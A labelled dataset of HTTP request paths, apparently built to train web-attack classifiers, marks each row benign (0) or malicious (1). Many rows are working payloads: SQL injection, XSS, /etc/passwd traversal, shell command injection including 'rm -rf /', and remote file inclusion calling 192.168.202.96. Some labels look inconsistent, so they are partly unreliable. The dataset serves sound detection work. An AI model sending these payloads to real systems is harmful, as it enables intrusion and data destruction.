request	label
/ edcord / 	0
/ scripts / forum . php ? id_article = 1 & id_forum = -1 /  *  *  / union /  *  *  / select 109024103 -- 	1
"/ string / strings / parameters = 1 %  ""  ""  )  ; select  ( case when  ( 4769 = 4769 )  then 4769 else 4769 *  ( select 4769 from mysql . db )  end )  # "	1
/ javascript / inc . bat 	0
/ string / strings / parameters = c /  cangas del narcea ,  97 ,  12 ? e 	0
/ changelog-jun2002 / 	0
/ recordings / admin / configset . php ? settings_dir =  / etc / passwd \ x00 	1
/ search_nero / 	0
/ ms365177 / 	0
/ r2extra / 	0
/ string / strings / parameters = 0057204714004346 	0
/ string / strings / parameters = 1 where 6173 = 6173 ; select count (  *  )  from all_users t1 , all_users t2 , all_users t3 , all_users t4 , all_users t5 -- 	1
/ string / strings / parameters = passeig de monjo 102 ,  11 ? a 	0
/ javascript / ora . lst 	0
"/ string / strings / parameters = 1 %  ""  ""  and 6408 = 7959 -- "	1
/ bzuf9ozq . pl ?  < script > cross_site_scripting . nasl <  / script > 	1
/ string / strings / parameters = * 694a47ndil 	0
/ javascript / piranha . exe 	1
/ string / strings / parameters = 7010348636170522 	0
/ string / modo = registro & login = laz & password = d4s8ab8 & nombre = caledonia & apellidos = antonioli + blanc & email = rao @ ajuntamentdebarcelona20 . vu & dni = 99892750r & direcciona = c /  + puerto + de + la + luz + 129 ,  +  & ciudad = valverde + del + majano & cp = 34126 & provincia = baleares +  ( illes )  & ntc = 4228631856170637 & b1 = registrar 	1
/ cacti / themes / program / themesettings . inc . php ? themesdir =  / etc / passwd \ x00 	1
/ string / strings / parameters = -3100 '  )  or 4144 =  ( select upper ( xmltype ( chr ( 60 )  |  | chr ( 58 )  |  | chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  |  |  ( select  ( case when  ( 4144 = 4144 )  then 1 else 0 end )  from dual )  |  | chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  |  | chr ( 62 )  )  )  from dual )  and  (  ' etuj '  like  ' etuj 	1
"/ m2fpztty . cgi ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ elearners_22c / 	0
/  \ xce \ x98 \ xce \ xb5 \ xce \ xaf \ xce \ xb1_ \ xce \ x9a \ xcf \ x89 \ xce \ xbc \ xcf \ x89 \ xce \ xb4 \ xce \ xaf \ xce \ xb1 / 	0
/ string / str =  $  ( echo tikhvb )   str1 =  $  {  # str }   if  [  2 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  | 	1
/ string / modo = any ?   set-cookie :  + tamper = 1041264011025374727 & precio = 4135 & b1 = pasar + por + caja 	1
/ entreprise_fr / 	0
"/ oie504mr . mscgi ?  < script > document . cookie =  "" testtpby = 7052 ;  ""  <  / script > "	1
/ examples / jsp / cal / cgiip . exe / wservice = wsbroker1 / webutil / ping . p 	1
/ 119530 / 	0
/ 044741 / 	0
/ 1164656826_34 / 	0
/ detail . asp ? nchannel =  ' 1 	1
/ string / strings / parameters = |   [  9 -ne  $  ( echo cdukus  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  /  / 	1
/ v15041113 / 	0
/ phone-design / 	0
"/ string / strings / parameters = <  / title >  < script > alert (  ""  "" crosssitescripting ""  ""  )  ;  <  / script > "	1
/ passepartout21dvd / 	0
/ rv98iwjp . x ?  < script > cross_site_scripting . nasl <  / script > 	1
/ string / errormsg = credenciales + incorrectas | 	1
/ javascript / transport . xslt 	0
/ 2607545440012677745qxkebu_th / 	0
/ iuhospital / 	0
"/ string / strings / parameters = 1 ""  ""  )  and 7533 = 7533 and  (  ""  "" yqzq ""  ""  =  ""  "" yqzq "	1
/ string / id = 3 & nombre = vino + rioja & precio = 39 & cantidad = 33 & b1 = aadir + al + carrito 	0
/ forum-ra_professionnel . asp ? n =  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
/ string / strings / parameters = 28598 	0
/ javascript / pbo . svn-base 	0
/ string / strings / parameters = 38 	0
/ string / strings / parameters = 95001516q 	0
/ javascript / realestate . dump 	0
/ string / strings / parameters = 1 '  |  |  ( select  ' djoe '  from dual where 8063 = 8063  ( select  ( case when  ( 4587 = 4587 )  then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 )  |  | char ( 69 )  |  | char ( 83 )  , null )  , 0 )  , 500000000 )  , null )  else char ( 76 )  |  | char ( 65 )  |  | char ( 102 )  |  | char ( 72 )  end )  from  ( values ( 0 )  )  )  )  |  |  ' 	1
/ perlwhirl / 	0
/ string / id = 3 & nombre = vino + rioja & precio = 85 & cantidad = 17 & b1 = aadir + al + carrito 	0
"/ ao22ww7y . jsp ?  < script > document . cookie =  "" testqppc = 8767 ;  ""  <  / script > "	1
/ msg00100 / 	0
/ string / strings / parameters = tamer 	0
/ croscillbenetellolampshade / 	0
/ index . php ? id =  ' union /  *  *  / select /  *  *  / 0 , 0 , 1649969852 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 -- 	1
/ string / strings / parameters = sinforiano 	0
/ string / strings / parameters = nolberto 	0
"/ string / strings / parameters = < img src = x onerror =  \ x32 "" javascript : alert ( 1 )  ""  > "	1
/ string / strings / parameters = -3436 )  or 9281 = 3172 	1
"/ egaet53a . exe ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ string / modo = registro & login = polson & password = empa . etar & nombre = salom & apellidos = fabra + vicente & email = mcguinness . clayburgh7 @ eldeseodepecar . gu & dni = 91624121x & direccion = c /  + granate + 13 ,  + 12h & ciudad = vdola ,  + la & cp = 42146 & provincia = toledo & ntc = 2875083717333458 & b1 = registrar 	0
/ flamingpear aio / 	0
"/ t7tm4m0b . do ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ t7tm4m0b . do ?  < script > cross_site_scripting . nasl <  / script > 	1
/ javascript / specials . save 	0
/ string / strings / parameters = c /  fernando vi 79 ,  1g 	0
/ interface / login / login_frame . php ? site =  < script > alert ( owasp zap )  ;  <  / script >  ' injected_param 	1
/ string / strings / parameters = 4132414285335498 	0
/ examples / jsp / jsp2 / jspx / file . php ? path =  / etc / passwd \ x00 	1
/ string / strings / parameters = 1 '  )  )  rlike  ( select  ( case when  ( 7689 = 7689 )  then 1 else 0x28 end )  )  and  (  (  ' trzi '  =  ' trzi 	1
/ string / strings / parameters = 1 or 8315 =  ( select count (  *  )  from sysibm . systables as t1 , sysibm . systables as t2 , sysibm . systables as t3 )  #  ehsr 	1
/ 1377662420 / 	0
/ phpmyadmin / way-board / way-board . cgi ? db =  / etc / passwd \ x00 	1
/ bt-vote / 	0
/ blueflops / 	0
/ mpcgi / shop / auth_data / auth_user_file . txt 	0
"/ main . php ? logout =  ""  & ver \ xa0 > q18437972 & rem \ xa0 "	1
/ string / strings / parameters = villanueva del conde 	0
/ string / strings / parameters = 1 or 2633 = dbms_pipe . receive_message ( chr ( 112 )  |  | chr ( 65 )  |  | chr ( 65 )  |  | chr ( 103 )  , 5 ) 	1
/ hotcorners / 	0
/ string / strings / parameters = 46704601l 	0
/ radiocleveland / 	0
/ string / strings / parameters = '  & echo $ ifshxzbrd $  (  ( 3 + 30 )  )  $  ( echo $ ifshxzbrd ) hxzbrd | 	1
/ cumclub16cumshotclips / 	0
/  /  < body >  < script src = http :  /  / www . example . com / test ? rnd = q64732494 >  <  / script > 	1
/ msg326165 / 	0
/ bulletproof_vest / 	0
/ javascript / at . java 	0
/ string / strings / parameters = 1 %  '  )  and 8189 =  ( select count (  *  )  from sysibm . systables as t1 , sysibm . systables as t2 , sysibm . systables as t3 )  -- 	1
/ capture-r0 / 	0
/ string / strings / parameters = zujovic yvosevich 	0
/ reportgenerator / 	0
/ 20061223135816beheshtieh_6666 / 	0
/ string / id = 1 /  & nombre = vino + rioja & precio = 39 & cantidad = 75 & b1 = aadir + al + carrito 	1
/ canadian_health / 	0
/ rtstats / 	0
/ string / strings / parameters = -9808 '  in boolean mode )  union all select 2528 , 2528 , 2528 , 2528 , 2528 , 2528 , 2528 -- 	1
/ components / com_mosmedia / media . tab . php ? mosconfig_absolute_path = http :  /  / 192 . 168 . 202 . 96 : 8080 / ipb5ri ? 	0
/ string / strings / parameters = 08586 	0
/ dire-straits / 	0
/ script / index . php ? path_inc = xxpathxx 	1
/ buttythumb / 	0
/ pstulovescrackk / 	0
/ string / id = 1 & nombre = jamn + ibrico & precio = 39 & cantidad = 44 & b1 = aadir + al + carrito 	0
"/ string / modo = insertar & precio = 1881 <  !  --  # exec + cmd =  "" rm + -rf +  /  ; cat +  / etc / passwd ""  +  --  >  & b1 = pasar + por + caja "	1
/ whiteblue-env / 	0
/ string / strings / parameters = horst @ engibraltar . com . co 	0
/ string / strings / parameters = trafelati zurera 	0
"/ top . php ? stuff =  "" del ; q52915956 & rem ; "	1
/ javascript / signer . trace 	0
/ 6230201 / 	0
/ javascript / go . exe 	1
/ image0021045483400900 / 	0
"/ jujgxwav . exe ?  < script > document . cookie =  "" testknim = 9383 ;  ""  <  / script > "	1
/ scripts / survey . inc . php ? path =  / etc / passwd \ x00 	1
/ tukodz3j . mscgi ?  < script > cross_site_scripting . nasl <  / script > 	1
/ 2185823650037176537itpftf_th / 	0
/ javascript / devel . dump 	0
/ evasion-figure3 / 	0
"/ dslpwt15 . nsf ?  < meta http-equiv = set-cookie content =  "" testtkio = 5454 ""  > "	1
/ commsrss . php ? files [ 0 ]  =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
/ string / strings / parameters = -8007 '  where 9649 = 9649 union all select 9649 , 9649 , 9649 , 9649 , 9649 , 9649 , 9649 , 9649 , 9649 -- 	1
/ cgi-bin / anyform 	0
/ string / str =  $  ( echo qofxcy )   str1 =  $  {  # str }   if  [  4 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  & 	1
/ 151459 / 	0
"/ string / strings / parameters = 1 ""  ""  )  )  )  union all select null -- "	1
/ string / modo = insertar & precio = 197 & b1 = confirmar 	0
"/ en-us / 9kr0ih0v . jsp ?  < meta http-equiv = set-cookie content =  "" testzgnm = 1183 ""  > "	1
/ string / strings / parameters = -7868 '  in boolean mode )  union all select 5117 , 5117 , 5117 , 5117 , 5117 , 5117 , 5117 , 5117 , 5117 # 	1
/ section_cyberpunk / 	0
/ javascript / blogs . ora 	0
/ string / strings / parameters = -1354 )  )  or 8571 = 8571 -- 	1
/ 043363 / 	0
/ string / strings / parameters = 1 '  )  )  )  and elt ( 2506 = 2383 , 2383 )  and  (  (  (  ' bjrj '  =  ' bjrj 	1
/ additional_webi / 	0
"/ xfkun1ku . php ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ funlove75 / 	0
/ 1567512585 / 	0
/ qa-5030 / 	0
/ resetpw . php ? email =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
/ string / strings / parameters = 84996241v 	0
/ string / strings / parameters = plaa de margarida xirgu 141 ,  2h 	0
/ javascript /  ~ eric . fcgi 	0
/ templates / oerdec / template . tpl . php ? renderer = xxpathxx 	1
/ string / strings / parameters = c /  hulla ,  179 	0
/ javascript / movie 	0
/ 113566 / 	0
/ d5a5renl . cfc ?  < script > cross_site_scripting . nasl <  / script > 	1
/ string / strings / parameters = '  echo $ ifsonezgx $  (  ( 68 + 29 )  )  $  ( echo $ ifsonezgx ) onezgx | 	1
"/ examples / servlets / servlet ? username =  ""  < script > foo <  / script "	1
/ osdc-news / 	0
/ keyboards_overr / 	0
"/ string / strings / parameters = 1 ""  ""  ; select count (  *  )  from all_users t1 , all_users t2 , all_users t3 , all_users t4 , all_users t5 and  ""  "" mpxd ""  ""  like  ""  "" mpxd "	1
/ string / strings / parameters = yuraj 	0
/ string / strings / parameters = 6g369zar41 	0
/ string / strings / parameters = valdovio 	0
/ string / strings / parameters = igea 	0
/ string / strings / parameters = 1 '  )  and row ( 6237 , 7469 )  >  ( select count (  *  )  , concat ( 0x7171706a71 ,  ( select  ( elt ( 6237 = 6237 , 1 )  )  )  , 0x717a767a71 , floor ( rand ( 0 )  * 2 )  ) x from  ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x )  and  (  ' jvll '  like  ' jvll 	1
/ en-us / account / shopexd . asp ? catalogid =  ' 42 	1
/ help . php ? q =  '  \ x0auname  > q19373947  # 	1
/ sgrunge / 	0
/ 177416 / 	0
/ string / str =  $  ( echo byujus )   str1 =  $  {  # str }   if  [  5 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  \  \ 	1
/ string / strings / parameters = winstanley @ waterflyesp . hn 	0
/ trgeorgia / 	0
/ v2-11033856 / 	0
/ string / strings / parameters = zacaras 	0
/ certifiedstars / 	0
/ pict483 / 	0
/ stylesheet . php ? version = 1331734079 	0
"/ esmozg5d . asp ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ string / strings / parameters = 51795949h 	0
/ examples / jsp / jsp2 / el / inc / exif . inc . php ? exif_prog =  ( echo -n  ' original_exif_prog_cmd_exec . nasl :   '  ; id )  |  | echo 	1
/ string / strings / parameters = alvino 	0
/ string / strings / parameters = 1 %  '  )  )  )  and 4595 = 4595 # 	1
/ admin / login . php ? absolute_path = xxpathxx 	1
/ string / strings / parameters = '   str =  $  ( echo giprgx )   str1 =  $  {  # str }   if  [  8 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  & 	1
/ 13597038 / 	0
/ javascript / trackers . yml 	0
/ classes / adodbt / sql . php ? classes_dir =  / etc / passwd \ x00 	1
/ 000108611 / 	0
/ petties-t / 	0
/ string / strings / parameters = velilla de cinca 	0
/ string / strings / parameters = 1 '  |  |  ( select  ' cozi '  from dual where 2607 = 2607 and 9660 =  ( select count (  *  )  from all_users t1 , all_users t2 , all_users t3 , all_users t4 , all_users t5 )  -- 	1
"/ string / strings / parameters = echo ltoenx $  (  ( 42 + 36 )  )  $  ( echo ltoenx ) ltoenx "" "	1
"/ string / strings / parameters = ""   str =  $  ( echo jltoou )   str1 =  $  {  # str }   if  [  6 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  & "	1
/ string / strings / parameters = ; echo uwapjx $  (  ( 78 + 84 )  )  $  ( echo uwapjx ) uwapjx & 	1
/ string / strings / parameters = < a href = ”http :  /  / www . google . com > clickme <  / a > 	1
"/ string / strings / parameters = |   [  2 -ne  $  ( echo jlugpx  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  "" "	1
/ javascript / catalog . phtml 	0
/ string / strings / parameters = ftp :  /  / 192 . 168 . 28 . 103 /  *  < apache_mod_proxy_ftp_glob_xss . nasl > 	1
/ string / strings / parameters = portillo 	0
/ javascript / esale . o 	0
"/ string / strings / parameters = -2067 ""  ""  or 3038 = 3038 "	1
/ handbag-giveaway / 	0
/ javascript / cnf . sfish 	0
/ javascript / pl . php3 	0
/ bgbottomleft / 	0
/ javascript / spam . exe 	1
/ dqbxwpd8tdrpi / 	0
/ en-us / account / index . php ? x = browse & category =  ' union select  ' 1 '  ,  ' 2 '  ,  ' pixelpost_category_sql_injection . nasl '  ,  ' 1331905219 '  ,  ' 5 '  -- 	1
/ string / strings / parameters = 1 '  in boolean mode )  or 8421 =  ( select count (  *  )  from generate_series ( 1 , 5000000 )  )  # 	1
/ 144394 / 	0
/ string / strings / parameters = 1 '  )  )  )  and  ( select 9067 from ( select count (  *  )  , concat ( 0x7171706a71 ,  ( select  ( elt ( 9067 = 9067 , 1 )  )  )  , 0x717a767a71 , floor ( rand ( 0 )  * 2 )  ) x from information_schema . character_sets group by x ) a )  and  (  (  (  ' dsok '  =  ' dsok 	1
/ string / modo = registro & login = toperzer1 & password = sufragio & nombre = oziel & apellidos = mar + mendivil & email = rattenbury_roquette @ ibizasounds . gh & dni = 69539711q & direccion = calle + ecuador + 143 +  & ciudad = gallegos + de + argan & cp = 03580 & provincia = toledo & ntc = 1940931931153821 & b1 = registrar 	0
/ 242474 / 	0
/ string / strings / parameters = 0h5rrad0 	0
/ 874128 / 	0
/ string / modo = registro & login = ofcparms & password = mutabilidad & nombre = petronio & apellidos = pedrol & email = cadoret @ escuelamontessori . pa & dni = 17229359j & direccion = hermanas + sanchez + tamargo ,  + 56 +  & ciudad = moreruela + de + los + infanzones & cp =  '  ,  ' 0 '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  --  & provincia = huelva & ntc = 9991778846189173 & b1 = registrar 	1
/ 677211 / 	0
/ javascript / scheduling . exe 	1
"/ ao22ww7y . cfm ?  < script > document . cookie =  "" testqppc = 8767 ;  ""  <  / script > "	1
/ string / str =  $  ( echo ycsciw )   str1 =  $  {  # str }   if  [  5 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  /  / 	1
/ string / strings / parameters = 12005174w 	0
/ deep-blue / 	0
/ top . php ? stuff = ver ;  > q99348313 & rem ; 	1
/ d7ktpmcq . aspx ?  < script > cross_site_scripting . nasl <  / script > 	1
/ supporter / index . php ? t = tickettime & id =  & lt ; script & gt ;  < script > alert (  ' vulnerable '  )  <  / script >  & lt ;  / script & gt ; 	1
/ string / strings / parameters = 1 '  where 3760 = 3760 union all select null , null , null , null , null , null , null , null # 	1
/ shpuntik / 	0
/ string / strings / parameters = 1 '  )  or 4411 =  ( select count (  *  )  from sysusers as sys1 , sysusers as sys2 , sysusers as sys3 , sysusers as sys4 , sysusers as sys5 , sysusers as sys6 , sysusers as sys7 )  and  (  ' uwbh '  =  ' uwbh 	1
/ string / modo = registro & login = keseris & password = canje & nombre = androlo & apellidos = ucedo + ballar & email = moffatt @ icodea . mq & dni = 92309128p & direccion = calle + suceso + terrero + 68 ,  + 7a & ciudad = azanuy-alins & cp = 39664 & provincia = cantabria & ntc = 5916923920449303 & b1 = registrar 	0
/ string / id = 3 & nombre = vino + rioja & precio = 39 & cantidad = 77 & b1 = aadir + al + carrito 	0
"/ 0qhcnefz . php3 ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ javascript / catalog . exe 	1
/ 172280 / 	0
/ string / strings / parameters = deering @ asociaciondearquitectoslatinoamericanos . sv 	0
/ _vti_bin / shtml . exe ? _vti_rpc 	1
/ modules / mod_flatmenu . php ? mosconfig_absolute_path = xxpathxx 	1
/ cacti / pmwiki . php ? globals [ farmd ]  =  / etc / passwd \ x00 	1
/ string / strings / parameters = hubach larrumbe 	0
/ javascript / intl . manifest 	0
/ 103011 / 	0
/ rent commercial / 	0
/ string / strings / parameters = + if ( benchmark ( 3000000 , md5 ( 1 )  )  , null , null )  , null )   /  * 	1
/ eei78ore . fts ?  < script > cross_site_scripting . nasl <  / script > 	1
/ javascript / library . py 	0
"/ jackrabbit / search . jsp ? q =  %  ""  < script > alert ( 1331904224 )  <  / script > "	1
/ string / strings / parameters = cribada 	0
/ tt0365830 / 	0
/ string / strings / parameters = 13270 	0
/ string / strings / parameters = 4354c07a 	0
/ top . php ? stuff = 1417058040 '  and 1 = 1 and  '  '  <  >  ' zoilnzf1 	1
/ string / strings / parameters = 12489 	0
"/ string / strings / parameters = 1 ""  ""  )  )  as ubrg where 7318 = 7318 and 7331 = 6529 -- "	1
/ dsc00842 / 	0
"/ vmi8bb12 . pl ?  < script > document . cookie =  "" testlerc = 2575 ;  ""  <  / script > "	1
/ phpmyadmin . conf 	0
/ examples / jsp / jsp2 / jspx / commerce . cgi ? page =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00index . html 	1
/ string / strings / parameters = mcisaac_burnham5 @ lamarsrl . tv 	0
/ string / strings / parameters = luxford_baumann @ lasiestacreativa . tel 	0
/ string / strings / parameters = dorra 	0
/ string / strings / parameters = 3318282529234021 	0
/ javascript / mojo . xslt 	0
/ p58-0x08 / 	0
"/ string / strings / parameters = |   [  4 -ne  $  ( echo mrdzpj  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  "" "	1
"/ main . php ? stuff =  ""  | ping ; -w ; 11000 ; -n ; 1 ; 4 . 3 . 2 . 1 | rem ; "	1
/ string / strings / parameters = '  |   [  8 -ne  $  ( echo tymeog  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  /  / 	1
/ egypt_portsaid / 	0
"/ string / errormsg =  <  !  --  # exec + cmd =  "" ls +  /  ""  --  > "	1
"/ string / strings / parameters = 1 ""  ""  )  ; select like (  ' abcdefg '  , upper ( hex ( randomblob ( 500000000 / 2 )  )  )  )  and  (  ""  "" unju ""  ""  =  ""  "" unju "	1
/ string / strings / parameters = 1 )  and 3824 = benchmark ( 5000000 , md5 ( 0x76555642 )  ) 	1
/ string / strings / parameters = 65658514t 	0
/ string / modo = entrar & login = marla & pwd = delito & remember = off & b1 = entrar 	0
/ 574523 / 	0
/ string / strings / parameters = 1 '  in boolean mode )  and 4241 = convert ( int ,  ( select char ( 113 )  + char ( 113 )  + char ( 112 )  + char ( 106 )  + char ( 113 )  +  ( select  ( case when  ( 4241 = 4241 )  then char ( 49 )  else char ( 48 )  end )  )  + char ( 113 )  + char ( 122 )  + char ( 118 )  + char ( 122 )  + char ( 113 )  )  )  # 	1
/  ~ philcannon / 	0
/ vbhs049 / 	0
/ string / strings / parameters = 1 '  )  and exp (  ~  ( select  *  from  ( select concat ( 0x7171706a71 ,  ( select  ( elt ( 8190 = 8190 , 1 )  )  )  , 0x717a767a71 , 0x78 )  ) x )  )  and  (  ' cuat '  =  ' cuat 	1
/ 000050724 / 	0
/ string / id = 1 & nombre = jamn + ibrico & precio = 85 & cantidad = set-cookie :  + tamper = 1041264011025374727 & b1 = aadir + al + carrito 	1
/ string / id = 3 & nombre = vino + rioja & precio = 100 & cantidad = 97 & b1 = aadir + al + carrito 	0
"/ m2fpztty . html ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ sa_photo / 	0
/ string / strings / parameters = 06760 	0
"/ main . php ? logout = 1 :  < iframe src =  "" http :  /  / www . aol . com ""  > "	1
/ scripts / parse_xml . cgi ? action = login & filename = frameset . html | id \ x00 | 	1
/ manager / webdist . cgi ? distloc =  ; id 	1
"/ string / strings / parameters = 1 %  ""  ""  )  )  and sleep ( 5 )  # "	1
/ rabbits_download / 	0
/ string / strings / parameters = -9557 )  where 2891 = 2891 union all select 2891 , 2891 , 2891 , 2891 , 2891 , 2891 , 2891 , 2891 , 2891 -- 	1
/ string / strings / parameters = 53424203x 	0
/ string / strings / parameters = 1 '  union all select null # 	1
/ mc50_2 / 	0
/ string / modo = entrar & login = shari & pwd = agobiado & remember = on & b1 = entrar '  + delete + from + users 	1
"/ en-us / account / login . php ? course =  ""  >  < script > alert ( atutor_xss . nasl )  <  / script > "	1
"/ bmeun223 . fts ?  < meta http-equiv = set-cookie content =  "" testhhwu = 7044 ""  > "	1
/ javascript / ads . html 	0
/ string / strings / parameters = '  |   [  8 -ne  $  ( echo jtxvkl  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1 	1
/ string / strings / parameters = ;  str =  $  ( echo sxgxts )  ;  str1 =  $  {  # str }  ;  if  [  5 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  & 	1
/ 135229 / 	0
/ string / strings / parameters = abcd |  % 8 . 8x |  % 8 . 8x |  % 8 . 8x |  % 8 . 8x |  % 8 . 8x |  % 8 . 8x |  % 8 . 8x |  % 8 . 8x |  % 8 . 8x |  % 8 . 8x | 	1
/ examples / jsp / checkbox / phprint . php ? module = vtiger_lang_crm_lfi . nasl & action = 1331904366 & lang_crm =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  / etc / passwd \ x00 	1
/ string / strings / parameters = -4394 '  )  )  union all select 3409 , 3409 -- 	1
/ string / strings / parameters = ;  str =  $  ( echo tnpfba )  ;  str1 =  $  {  # str }  ;  if  [  2 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  ' 	1
/ 188430 / 	0
"/ string / strings / parameters = echo ixgijz $  (  ( 51 + 13 )  )  $  ( echo ixgijz ) ixgijz "" "	1
"/ zroo33l4 . cgi ?  < meta http-equiv = set-cookie content =  "" testiklc = 904 ""  > "	1
/ phish051009c / 	0
/ dhcp_unknown / 	0
/ 405890 / 	0
/ string / strings / parameters = hermon 	0
/ 2500586874258080_0 / 	0
/ whycan ' tifindajob / 	1
/ disgen 8 / 	0
/ advsearch / 	0
/ javascript / access_log . 1 . orig 	0
/ string / strings / parameters = riegger . zaleska @ cirujanaplastica . cn 	0
/ javascript / view-source . sql 	0
"/  "" user centric identity ""  / "	1
/ fcgi-bin / a1stats / a1disp3 . cgi ?  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
/ string / modo = entrar & login = espuna & pwd = v8s684t29a & remember = off & b1 = entrar 	0
/ p1040041 / 	0
/ bannerstarcraft / 	0
/ string / strings / parameters = perpiny romero 	0
/ desktopcal / 	0
/ mp ' s_surgery / 	1
/ string / modo = insertar & precio = 3929 & b1 = confirmar 	0
/ 1165685555084 / 	0
/ icon-wii / 	0
"/ string / strings / parameters = 1 ""  ""  )  and char ( 109 )  |  | char ( 79 )  |  | char ( 70 )  |  | char ( 90 )  = regexp_substring ( repeat ( right ( char ( 5012 )  , 0 )  , 5000000000 )  , null )  -- "	1
/ cgi-perl / ppdscgi . exe 	1
/ javascript / srv . 7z 	0
/ string / strings / parameters = ( case when 2646 = 8520 then 2646 else null end ) 	1
/ javascript / def . rtf 	0
"/ 8t9v8k7x . jsp ?  < script > document . cookie =  "" testhvje = 9403 ;  ""  <  / script > "	1
/ string / strings / parameters = 63974696n 	0
/ 123366 / 	0
/ string / strings / parameters = 8uiza1illo 	0
/ phpmyadmin / cgi-bin 	0
/ autonomous-weapons / 	0
/ string / strings / parameters = 1 '  )  )  )  or  ( select 9173 from ( select count (  *  )  , concat ( 0x7171706a71 ,  ( select  ( elt ( 9173 = 9173 , 1 )  )  )  , 0x717a767a71 , floor ( rand ( 0 )  * 2 )  ) x from information_schema . character_sets group by x ) a )  and  (  (  (  ' yiem '  =  ' yiem 	1
/ manager / index . php ? _language =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 	1
/ download-12 / 	0
/ atompub-notification / 	0
/ string / strings / parameters = 1 )  )  as tbiq where 7159 = 7159 and 8635 =  ( select count (  *  )  from generate_series ( 1 , 5000000 )  )  -- 	1
/ admin / news . admin . php ? path_to_script = http :  /  / 192 . 168 . 202 . 96 : 8080 / whmch8ftkt7kv ?  ?  & cmd = ls 	1
/ javascript / outgoing . exe 	1
/ debian-backports / 	0
/ fabolous ft mike shorey baby / 	0
/ javascript / sites . cgi 	0
/ 060615_1658minutes / 	0
/ 10basilicata / 	0
/ string / strings / parameters = '   str =  $  ( echo wyaquw )   str1 =  $  {  # str }   if  [  8 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  \  \ 	1
/ cgi-bin / index . php ? op = default & date = 200607 '  union select 1 , 199642765 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 --  & blogid = 1 	1
/ string / strings / parameters = 1 '  where 5103 = 5103 ; select case when 7717 = 7717 then 1 else null end -- 	1
